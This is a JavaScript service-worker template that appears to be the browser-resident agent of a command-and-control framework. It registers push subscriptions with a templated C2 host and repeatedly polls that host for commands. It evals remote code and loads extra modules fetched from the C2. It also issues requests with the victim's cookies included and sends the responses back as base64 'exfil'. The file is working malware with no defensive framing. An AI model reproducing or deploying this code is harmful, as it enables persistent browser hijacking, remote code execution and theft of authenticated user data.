C2_HOST = '//{{host}}';
C2_SERVER = C2_HOST + '/agent/{{agent_token}}';

var counter = 0;
var agentID = "{{agentID}}";

function activateModules(){
  WriteIDB("active", 1);
  new Promise((res, rej) => {
    ReadIDB("extra_modules", rej);
  }).catch(function(m){
    try{
      var j = JSON.parse(m);
      for(k in j){
        fetch(C2_HOST + '/modules/' + k).
        then(function(response){ // Get module definition
          try{
            return response.text();
          }catch (e){
            console.log("Failed fetch of module");
            return false;
          }
        }).then(function(text){
          eval(text);
        });
      }
    }catch{
      console.log("Failed to parse extra_modules");
    }
  });
}

self.addEventListener('sync', function(event){
  activateModules();
  if (event.tag == 'outbox'){
  	counter++;
    fetch("/Sync1_Activated");
    console.log("Sync activated-" + counter)
    event.waitUntil(new Promise((resolve, reject) => {
    	SI("sync_outbox1");
    }));
    console.log("Sync activated.waitUntil_finished")
  }else if (event.tag == 'outbox2'){
    event.waitUntil(new Promise((resolve, reject) => {
      event.waitUntil(new Promise((resolve2, reject2) => {
        var runcounter = ReadIDB("sync2", reject2);
      }).catch(function(runcounter){
        console.log("ReadDB. Runcounter=" + runcounter);
        if(runcounter == undefined){
          runcounter = 0;
        }
        runcounter += 1;
        WriteIDB("sync2", runcounter);
        console.log("Sync2-Outbox2 activated-. Run# " + runcounter);
        fetch("/SYNC2-OUTBOX2");
        if(runcounter == 1)
          return Promise.reject("error");
        if(runcounter == 2 || runcounter == 3){
          SI("sync_outbox2:" + runcounter)
        };
      }))
    }))
  }else if (event.tag == 'outbox3'){
    event.waitUntil(new Promise((resolve, reject) => {
      event.waitUntil(new Promise((resolve2, reject2) => {
        var runcounter = ReadIDB("sync3", reject2);
      }).catch(function(runcounter){
        console.log("ReadDB. Runcounter=" + runcounter);
      if(runcounter == undefined){
        runcounter = 0;
      }
      runcounter += 1;
      WriteIDB("sync3", runcounter);
      console.log("Sync3-Outbox2 activated-. Run# " + runcounter);
      fetch("/SYNC3-OUTBOX3");
      if(runcounter == 1)
        setTimeout(function(){ 
          fetch("/Sync3_Ends");
          return Promise.reject("error");
        },1000*60*3);
      if(runcounter == 2){
        fetch("/Sync3_Ends");
        return Promise.reject("error");
      }
      if(runcounter == 3){
        SI("sync_outbox3:"+runcounter);
      }
      }))
    }))
  }else if (event.tag == 'outbox4'){
    fetch("/SYNC3-OUTBOX4");
    event.waitUntil(new Promise((resolve, reject) => {return reject("ERror")}));
  }else if (event.tag == 'outbox999'){
    console.log("OUTBOX999!!!!");
  }else if(event.tag =="CreateDB"){
  }
});

function urlB64ToUint8Array(base64String){
  const padding = '='.repeat((4 - base64String.length % 4) % 4);
  const base64 = (base64String + padding).replace(/\-/g, '+').replace(/_/g, '/');
  const rawData = atob(base64);
  const outputArray = new Uint8Array(rawData.length);
  for (let i = 0; i < rawData.length; ++i){
	   outputArray[i] = rawData.charCodeAt(i);
  }
  return outputArray;
}

function postPushReg(sub){
  var rawKey = sub.getKey ? sub.getKey('p256dh') : '';
  var key = rawKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey))) : '';
  var rawAuthSecret = sub.getKey ? sub.getKey('auth') : '';
  var authSecret = rawAuthSecret ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawAuthSecret))) : '';
  var endpoint = sub.endpoint;
  fetch(C2_SERVER + '/registration', {
    method: 'post',
    headers: {'Content-type': 'application/json'},
    body: JSON.stringify({endpoint: sub.endpoint, key: key, authSecret: authSecret, agentID: agentID}),
  });
}

self.addEventListener('push', function(event){
  activateModules();
  event.waitUntil(new Promise((resolve, reject) => {
  	SI("push"); 
  }));
});

function reg(){
  self.registration.pushManager.getSubscription()
  .then(function(sub){
	  if (sub) return postPushReg(sub);
	  return self.registration.pushManager.subscribe({
      userVisibleOnly: true,
		  applicationServerKey: urlB64ToUint8Array('{{vapidPub}}')}
    ).then(function(sub){
		   postPushReg(sub);
		});
 });
}

self.addEventListener('install', function(event){
  console.log("SW installed -from sw.js");
  commandAndExecute("install");
  indexedDB.deleteDatabase("swdb");
});

self.addEventListener('message', function(e){
  if(e.data.p == '1'){setTimeout(reg, 100)}
});

function WriteIDB(key, value){
  var request = indexedDB.open("swdb", 1);
  request.onupgradeneeded = function(event){ 
    console.log("onupgradeneeded");
    // Save the IDBDatabase interface 
    var db = event.target.result;
    // Create an objectStore for this database
    var objectStore = db.createObjectStore("swobjstore");
  };
  request.onerror = function(event){
    console.log("onerror");
  };
  request.onsuccess = function(event){
    console.log("onsuccess1");
    var db = event.target.result;
    var transaction = db.transaction(["swobjstore"], "readwrite");
    var objectStore = transaction.objectStore("swobjstore");
    objectStore.put(value, key);
    console.log("onsuccess");
  };
}

function ReadIDB(key, reject){
  var request = indexedDB.open("swdb", 1);
  request.onupgradeneeded = function(event){ 
    console.log("onupgradeneeded");
    // Save the IDBDatabase interface 
    var db = event.target.result;
    // Create an objectStore for this database
    var objectStore = db.createObjectStore("swobjstore");
  };
  request.onerror = function(event){
    console.log("onerror");
  };
  request.onsuccess = function(event){
    console.log("onsuccess1");
    var db = event.target.result;
    var transaction = db.transaction(["swobjstore"], "readwrite");
    var objectStore = transaction.objectStore("swobjstore");
    var getRequest = objectStore.get(key);
    getRequest.onsuccess = function(event){
      console.log("onsuccess");
      reject(getRequest.result);
    }
  };
}

function commandAndExecute(Meta){
  fetch(C2_SERVER + '/get?data=..' + counter + '..' + Meta + '&agentID=' + agentID + "&domain=" + self.location.hostname + "&port=" + self.location.port).
  then(function(response){ // Get command from C2
    try{
      return response.json();
    }catch (e){
      console.log("Failed remote fetch");
      return false;
    }
  }).then(function(json){
    if(json == false)
      return;
    if(Object.keys(json).length == 0){
      console.log("Polled C2 - No more to do"); 
      return;
    }
    console.log("success remote fetch--" + json['ID'] + "--" + json['URL']);

    if('EVAL' in json){ // NON URL FETCH. EX: MODULE REGISTRATION
      eval(json.EVAL);
    }else{ // URL FETCH
      var uuid = json['ID'];
      var exfil = {"headers":{}, 'ID':uuid};
      var fetch_options = {};
      fetch_options['method'] = json['Request']['method'];
      fetch_options['headers'] = json['Request']['headers'];
      fetch_options['credentials'] = "include";
      
      if (json['Request']["body"] != undefined) 
        fetch_options['body'] = atob(json['Request']['body']);

      fetch(json['URL'], fetch_options).then(function(response){
        exfil["status"] = response.status; 
        for (var cur_header of response.headers.entries()){
          exfil["headers"][cur_header[0]] = cur_header[1];
        }
        response.arrayBuffer().then(function (arrayBuffer){
          exfil["DATA"] = base64ArrayBuffer(arrayBuffer);
          fetch(C2_SERVER+ '/put/' + uuid,{
            body: JSON.stringify(exfil),
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            }
          });
        });
      });
    }
  });
}

function SI(Meta){
	setTimeout(function(){ 
	  commandAndExecute(Meta);
    SI(Meta);
  }, 500);
}

function registerModule(name){
  new Promise((res, rej) => {
    ReadIDB("extra_modules", rej);
  }).catch(function(m){
    if(m == undefined){
      m = {};
    }else{
      m = JSON.parse(m);
    }
    m[name] = name;
    WriteIDB("extra_modules", JSON.stringify(m));
  });
}

function deregisterModule(name){
  new Promise((res, rej) => {
    ReadIDB("extra_modules", rej);
  }).catch(function(m){
    if(m != undefined){
      m = JSON.parse(m);
      delete m[name];
      WriteIDB("extra_modules", JSON.stringify(m));
    }
  });
}

function sendModuleResultToC2(name, data){
  fetch(C2_SERVER + '/module/' + name + '/' + agentID, {
    body: data,
    method: 'POST'
  });
}

function base64ArrayBuffer(arrayBuffer){
  var base64    = '';
  var encodings = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  var bytes         = new Uint8Array(arrayBuffer);
  var byteLength    = bytes.byteLength;
  var byteRemainder = byteLength % 3;
  var mainLength    = byteLength - byteRemainder;
  var a, b, c, d;
  var chunk;
  // Main loop deals with bytes in chunks of 3
  for (var i = 0; i < mainLength; i = i + 3){
    // Combine the three bytes into a single integer
    chunk = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
    // Use bitmasks to extract 6-bit segments from the triplet
    a = (chunk & 16515072) >> 18; // 16515072 = (2^6 - 1) << 18
    b = (chunk & 258048)   >> 12; // 258048   = (2^6 - 1) << 12
    c = (chunk & 4032)     >>  6; // 4032     = (2^6 - 1) << 6
    d = chunk & 63;               // 63       = 2^6 - 1
    // Convert the raw binary segments to the appropriate ASCII encoding
    base64 += encodings[a] + encodings[b] + encodings[c] + encodings[d];
  }
  // Deal with the remaining bytes and padding
  if (byteRemainder == 1){
    chunk = bytes[mainLength];
    a = (chunk & 252) >> 2; // 252 = (2^6 - 1) << 2
    // Set the 4 least significant bits to zero
    b = (chunk & 3)   << 4; // 3   = 2^2 - 1
    base64 += encodings[a] + encodings[b] + '==';
  } else if (byteRemainder == 2){
    chunk = (bytes[mainLength] << 8) | bytes[mainLength + 1];
    a = (chunk & 64512) >> 10; // 64512 = (2^6 - 1) << 10
    b = (chunk & 1008)  >>  4; // 1008  = (2^6 - 1) << 4
    // Set the 2 least significant bits to zero
    c = (chunk & 15)    <<  2; // 15    = 2^4 - 1
    base64 += encodings[a] + encodings[b] + encodings[c] + '=';
  }
  return base64;
}
